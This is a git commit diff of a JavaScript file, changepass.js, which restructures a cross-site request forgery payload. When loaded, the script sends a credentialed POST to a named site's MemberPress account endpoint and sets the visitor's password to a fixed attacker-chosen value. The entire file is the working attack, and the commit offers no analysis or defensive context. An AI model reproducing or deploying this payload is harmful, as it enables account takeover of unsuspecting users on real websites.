1bfd1c30ddb56ac7edd5391eee5a6b20205c2910
Abde lilah <85647797+0xGLSS@users.noreply.github.com>
2024-12-29 17:21:07 +0000

    Update changepass.js

--- changepass.js
+++ changepass.js
@@ -1,18 +1,16 @@
-function submitRequest() {
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://itpm.com:443/itpm-account/?action=newpassword", true);
-    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
-    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xhr.withCredentials = true;
 
-    var body = "plugin=mepr&action=updatepassword&mepr-new-password=KarnelPass1R%40&mepr-confirm-password=KarnelPass1R%40";
-    var aBody = new Uint8Array(body.length);
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://itpm.com:443/itpm-account/?action=newpassword", true);
+xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.withCredentials = true;
 
-    for (var i = 0; i < aBody.length; i++) {
-        aBody[i] = body.charCodeAt(i);
-    }
+var body = "plugin=mepr&action=updatepassword&mepr-new-password=KarnelPass1R%40&mepr-confirm-password=KarnelPass1R%40";
+var aBody = new Uint8Array(body.length);
 
-    xhr.send(new Blob([aBody]));
+for (var i = 0; i < aBody.length; i++) {
+    aBody[i] = body.charCodeAt(i);
 }
 
-submitRequest();
+xhr.send(new Blob([aBody]));
+
